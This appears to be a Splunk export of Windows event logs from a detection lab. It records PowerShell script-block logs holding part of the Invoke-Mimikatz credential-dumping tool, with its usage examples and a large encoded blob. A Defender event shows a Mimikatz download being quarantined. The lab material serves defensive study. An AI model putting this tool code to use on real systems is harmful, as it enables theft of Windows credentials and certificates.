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
+79490727-fa2f-46e6-bf60-bef62708dfb5","2025-11-23T14:38:46.646+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,117,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",117,"mydfir-project",,186,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+"$Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)","'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'",,,,,"DESKTOP-78CU07R","[System.Runtime.InteropServices.MarshalAsAttribute]",,DumpCreds,"$TypeBuilder.CreateType()",,,,"[AppDomain]","New-Object",4104,3,,,,"$TypeBuilder.CreateType()","$TypeBuilder.CreateType()",,,,,,,None,"Microsoft-Windows-PowerShell/Operational","$TypeBuilder.CreateType()","$TypeBuilder.CreateType()","$true",Splunk,"$AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)",,On,,,,,,,,,DumpCreds,0,,,,,,,,108,,,"{",,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell","$TypeBuilder.CreateType()",,Execute,,Warning,"$ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])","NOT_TRANSLATED",,,,,,,,"New-Object","11/23/2025 08:38:46.645 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=108
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+function Invoke-Mimikatz
+{
+<#
+.SYNOPSIS
+
+This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
+dump credentials without ever writing the mimikatz binary to disk. 
+The script has a ComputerName parameter which allows it to be executed against multiple computers.
+
+This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
+
+Function: Invoke-Mimikatz
+Author: Joe Bialek, Twitter: @JosephBialek
+Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
+License:  http://creativecommons.org/licenses/by/3.0/fr/
+Required Dependencies: Mimikatz (included)
+Optional Dependencies: None
+Mimikatz version: 2.0 alpha (12/14/2015)
+
+.DESCRIPTION
+
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+functionality provided with Mimikatz.
+
+.PARAMETER DumpCreds
+
+Switch: Use mimikatz to dump credentials out of LSASS.
+
+.PARAMETER DumpCerts
+
+Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
+
+.PARAMETER Command
+
+Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz ""privilege::debug exit"" as an example.
+
+.PARAMETER ComputerName
+
+Optional, an array of computernames to run the script on.
+	
+.EXAMPLE
+
+Execute mimikatz on the local computer to dump certificates.
+Invoke-Mimikatz -DumpCerts
+
+.EXAMPLE
+
+Execute mimikatz on two remote computers to dump credentials.
+Invoke-Mimikatz -DumpCreds -ComputerName @(""computer1"", ""computer2"")
+
+.EXAMPLE
+
+Execute mimikatz on a remote computer with the custom command ""privilege::debug exit"" which simply requests debug privilege and exits
+Invoke-Mimikatz -Command ""privilege::debug exit"" -ComputerName ""computer1""
+
+.NOTES
+This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
+Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
+Find mimikatz at: http://blog.gentilkiwi.com
+
+.LINK
+
+http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+#>
+
+[CmdletBinding(DefaultParameterSetName=""DumpCreds"")]
+Param(
+	[Parameter(Position = 0)]
+	[String[]]
+	$ComputerName,
+
+    [Parameter(ParameterSetName = ""DumpCreds"", Position = 1)]
+    [Switch]
+    $DumpCreds,
+
+    [Parameter(ParameterSetName = ""DumpCerts"", Position = 1)]
+    [Switch]
+    $DumpCerts,
+
+    [Parameter(ParameterSetName = ""CustomCommand"", Position = 1)]
+    [String]
+    $Command
+)
+
+Set-StrictMode -Version 2
+
+
+$RemoteScriptBlock = {
+	[CmdletBinding()]
+	Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[String]
+		$PEBytes64,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+		[String]
+		$PEBytes32,
+		
+		[Parameter(Position = 2, Mandatory = $false)]
+		[String]
+		$FuncReturnType,
+				
+		[Parameter(Position = 3, Mandatory = $false)]
+		[Int32]
+		$ProcId,
+		
+		[Parameter(Position = 4, Mandatory = $false)]
+		[String]
+		$ProcName,
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [String]
+        $ExeArgs
+	)
+	
+	###################################
+	##########  Win32 Stuff  ##########
+	###################################
+	Function Get-Win32Types
+	{
+		$Win32Types = New-Object System.Object
+
+		#Define all the structures/enums that will be used
+		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
+		$Domain = [AppDomain]::CurrentDomain
+		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+
+		############    ENUM    ############
+		#Enum MachineType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
+		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+		$MachineType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
+
+		#Enum MagicType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
+		$MagicType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
+
+		#Enum SubSystemType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
+		$SubSystemType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
+
+		#Enum DllCharacteristicsType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
+		$DllCharacteristicsType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
+
+		###########    STRUCT    ###########
+		#Struct IMAGE_DATA_DIRECTORY
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
+		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
+
+		#Struct IMAGE_FILE_HEADER
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
+		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
+		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
+
+		#Struct IMAGE_OPTIONAL_HEADER64
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
+		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
+		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
+		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
+		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
+		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
+		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
+		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
+		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
+		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
+		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
+		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
+		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
+		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
+		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
+		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
+		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
+		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
+		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
+		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
+		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
+		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
+		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
+		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
+		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
+		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
+		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
+		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
+		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
+		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
+		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
+		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
+		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
+		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
+		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
+		($TypeBuilde
+79490727-fa2f-46e6-bf60-bef62708dfb5","2025-11-23T14:38:46.645+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,108,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",108,"mydfir-project",,270,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,1117,4,,,,,,,,,,,,None,"Microsoft-Windows-Windows",,,,Microsoft,,,Info,,,,,,,,,,,,,,,,,,297,,,,,,,,"S-1-5-18",0,"Microsoft-Windows-Windows",,,None,,Information,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:22:12.118 AM
+LogName=Microsoft-Windows-Windows Defender/Operational
+EventCode=1117
+EventType=4
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-18
+SidType=0
+SourceName=Microsoft-Windows-Windows Defender
+Type=Information
+RecordNumber=297
+Keywords=None
+TaskCategory=None
+OpCode=Info
+Message=Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz&threatid=2147686744&enterprise=0
+ 	Name: HackTool:Win32/Mimikatz
+ 	ID: 2147686744
+ 	Severity: High
+ 	Category: Tool
+ 	Path: file:_C:\Users\chalitha\Downloads\Unconfirmed 548256.crdownload; webfile:_C:\Users\chalitha\Downloads\Unconfirmed 548256.crdownload|https://release-assets.githubusercontent.com/github-production-release-asset/18496166/28e3acb5-ca66-40d5-bc68-f76f5bfabecf?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&rscd=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&rsct=application4.18.25100.9008Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-11-23T14{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A06{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A46Z&ske=2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z&sks=b&skv=2018-11-09&sig=c4.18.25100.9008BgglADSB2CHu4edt6MPzc0aKAXNMi59vi3S2Ztd7Wk{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w&response-content-disposition=attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip&response-content-type=ap
+ 	Detection Origin: Internet
+ 	Detection Type: Concrete
+ 	Detection Source: Downloads and attachments
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Quarantine
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.441.427.0, AS: 1.441.427.0, NIS: 1.441.427.0
+ 	Engine Version: AM: 1.1.25100.9002, NIS: 1.1.25100.9002","2025-11-23T14:22:12.118+0000",,,None,,"DESKTOP-78CU07R","DESKTOP-78CU07R",0,297,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",297,"mydfir-project","eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MzkwODAyNiwibmJmIjoxNzYzOTA3NzI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L4ymMr8hYNM4ztl3yxqt4qE1UBYEch3o8001NLWfV-w",33,37020,"HackTool:Win32/Mimikatz",,,,,"//_::._=--_/===-==---==--_======________________.\r",,,"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}BDESKTOP-78CU07R\chalithafilename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip",ap,,"attachment{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}B+filename{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}Dmimikatz_trunk.zip","application4.18.25100.9008Foctet-stream","2025-11-23T15{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A07{096AEA90-851E-4F6F-81CB-EB5FE2A491AE}A03Z",,,,informational,4,"c4.18.25100.9008Bg